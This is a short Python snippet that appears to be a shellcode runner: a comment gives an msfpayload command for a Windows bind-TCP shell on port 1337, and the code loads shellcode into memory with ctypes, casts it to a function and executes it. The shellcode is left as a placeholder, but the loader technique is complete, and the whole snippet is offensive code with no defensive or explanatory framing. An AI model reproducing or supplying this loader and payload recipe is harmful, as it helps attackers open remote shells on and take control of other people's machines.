#msfpayload windows/shell_bind_tcp LPORT =1337 C
from ctypes import *
shellcode = ("Hex");
memorywithshell = create_string_buffer(shellcode, len(shellcode))
shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
shell()